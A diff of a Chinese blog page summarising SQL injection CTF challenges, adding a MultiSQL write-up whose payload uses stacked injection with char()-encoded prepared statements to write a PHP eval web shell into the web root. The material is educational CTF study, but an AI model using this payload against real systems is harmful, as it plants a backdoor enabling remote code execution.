@@ -51,6 +51,7 @@
 <meta property="og:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20200731110104215.png">
 <meta property="og:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20200731120018365.png">
 <meta property="og:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20200731115949826.png">
+<meta property="og:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20201023123614588.png">
 <meta property="og:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20200731121151110.png">
 <meta property="og:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20200731121527372.png">
 <meta property="og:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20200731122313716.png">
@@ -77,7 +78,7 @@
 <meta property="og:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20200803140509047.png">
 <meta property="og:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20200803140611813.png">
 <meta property="article:published_time" content="2020-07-31T02:43:51.586Z">
-<meta property="article:modified_time" content="2020-08-26T04:24:33.036Z">
+<meta property="article:modified_time" content="2020-10-23T04:40:38.051Z">
 <meta property="article:author" content="Zzzy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://rookiez996.github.io/images/buu%E4%B8%AD%E7%9A%84sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/image-20200731120525808.png">
@@ -220,7 +221,7 @@
     <aside class="post-widget">
         <nav class="post-toc-wrap" id="post-toc">
             <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#buu中的sql注入刷题总结"><span class="post-toc-number">1.</span> <span class="post-toc-text">buu中的sql注入刷题总结</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#签到题"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">签到题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-EasySQL-万能密码"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">[极客大挑战 2019]EasySQL(万能密码)</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#堆叠注入"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">堆叠注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SUCTF-2019-EasySQL"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">[SUCTF 2019]EasySQL</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#union注入"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">union注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-LoveSQL"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-BabySQL（双写绕过过滤）"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">[极客大挑战 2019]BabySQL（双写绕过过滤）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#GXYCTF2019-BabySQli（构造虚拟数据）"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">[GXYCTF2019]BabySQli（构造虚拟数据）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#网鼎杯-2018-Fakebook-SSRF、序列化、构造虚拟数据"><span class="post-toc-number">1.3.4.</span> <span class="post-toc-text">[网鼎杯 2018]Fakebook(SSRF、序列化、构造虚拟数据)</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#报错注入"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">报错注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-HardSQL"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">[极客大挑战 2019]HardSQL</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#盲注"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-FinalSQL"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#BJDCTF-2nd-简单注入"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">[BJDCTF 2nd]简单注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#GYCTF2020-Ezsqli-无列名"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">[GYCTF2020]Ezsqli(无列名)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RoarCTF-2019-Online-Proxy"><span class="post-toc-number">1.5.4.</span> <span class="post-toc-text">[RoarCTF 2019]Online Proxy</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#二次注入"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">二次注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RCTF2015-EasySQL"><span class="post-toc-number">1.6.1.</span> <span class="post-toc-text">[RCTF2015]EasySQL</span></a></li></ol></li></ol></li></ol>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#buu中的sql注入刷题总结"><span class="post-toc-number">1.</span> <span class="post-toc-text">buu中的sql注入刷题总结</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#签到题"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">签到题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-EasySQL-万能密码"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">[极客大挑战 2019]EasySQL(万能密码)</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#堆叠注入"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">堆叠注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SUCTF-2019-EasySQL"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#SUCTF-2018-MultiSQL"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">[SUCTF 2018]MultiSQL</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#union注入"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">union注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-LoveSQL"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-BabySQL（双写绕过过滤）"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">[极客大挑战 2019]BabySQL（双写绕过过滤）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#GXYCTF2019-BabySQli（构造虚拟数据）"><span class="post-toc-number">1.3.3.</span> <span class="post-toc-text">[GXYCTF2019]BabySQli（构造虚拟数据）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#网鼎杯-2018-Fakebook-SSRF、序列化、构造虚拟数据"><span class="post-toc-number">1.3.4.</span> <span class="post-toc-text">[网鼎杯 2018]Fakebook(SSRF、序列化、构造虚拟数据)</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#报错注入"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">报错注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-HardSQL"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">[极客大挑战 2019]HardSQL</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#盲注"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#极客大挑战-2019-FinalSQL"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">[极客大挑战 2019]FinalSQL</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#BJDCTF-2nd-简单注入"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">[BJDCTF 2nd]简单注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#GYCTF2020-Ezsqli-无列名"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">[GYCTF2020]Ezsqli(无列名)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RoarCTF-2019-Online-Proxy"><span class="post-toc-number">1.5.4.</span> <span class="post-toc-text">[RoarCTF 2019]Online Proxy</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#二次注入"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">二次注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RCTF2015-EasySQL"><span class="post-toc-number">1.6.1.</span> <span class="post-toc-text">[RCTF2015]EasySQL</span></a></li></ol></li></ol></li></ol>
         </nav>
     </aside>
    
@@ -251,7 +252,7 @@
         </div>
         <div class="post-count-custom">
             <i class="icon icon-lg icon-comment-o"></i>
-            阅读本文可能花费您&nbsp;<span class="post-count">12</span>&nbsp;分钟
+            阅读本文可能花费您&nbsp;<span class="post-count">13</span>&nbsp;分钟
         </div>
         <div class="post-content" id="post-content" itemprop="postContent">
             <h1 id="buu中的sql注入刷题总结"><a href="#buu中的sql注入刷题总结" class="headerlink" title="buu中的sql注入刷题总结"></a>buu中的sql注入刷题总结</h1><p>[TOC]</p>
@@ -290,6 +291,26 @@
 <p><strong>方法2</strong>：据说Oracle数据可以用”||”来拼接字符串，但是mysql不行。但是可以设置，构造</p>
 <p><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>，将<strong>sql语句中的”||”作用修改为拼接字符串</strong>。此时就可以让”1”和flag字段拼接起来，返回查询结果。</p>
 <img src="/images/buu中的sql注入刷题总结/image-20200731115949826.png" style="zoom:67%;">
+
+
+
+<h3 id="SUCTF-2018-MultiSQL"><a href="#SUCTF-2018-MultiSQL" class="headerlink" title="[SUCTF 2018]MultiSQL"></a>[SUCTF 2018]MultiSQL</h3><p>容易发现/user/user.php的id参数存在注入</p>
+<img src="/images/buu中的sql注入刷题总结/image-20201023123614588.png" alt="image-20201023123614588" style="zoom:50%;">
+
+<p>测试发现<strong>select被过滤</strong>，但是存在堆叠注入。</p>
+<blockquote>
+<p>过滤了select然后存在堆叠注入的可以使用<strong>预处理注入</strong>，尝试写入shell，因为过滤了select等字符，<strong>使用<code>char()</code>绕过</strong></p>
+</blockquote>
+<p>需要执行的代码为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php eval($_POST[_]);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/favicon/shell.php'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>将其转化为<code>char()</code>形式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59)</span><br></pre></td></tr></table></figure>
+
+<p>最终payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;2;set @sql&#x3D;char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;</span><br></pre></td></tr></table></figure>
+
+
 
 <h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><h3 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h3><p>同样熟悉的场景，先采用万能密码登陆，但是发现登陆成功后不是直接给flag了，而是告诉我admin用户的密码。</p>
 <img src="/images/buu中的sql注入刷题总结/image-20200731121151110.png" alt="image-20200731121151110" style="zoom:67%;">
@@ -430,7 +451,7 @@
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2020-08-26T04:24:33.036Z" itemprop="dateUpdated">2020-08-26 12:24:33</time>
+    Last updated: <time datetime="2020-10-23T04:40:38.051Z" itemprop="dateUpdated">2020-10-23 12:40:38</time>
 </span>
 
 
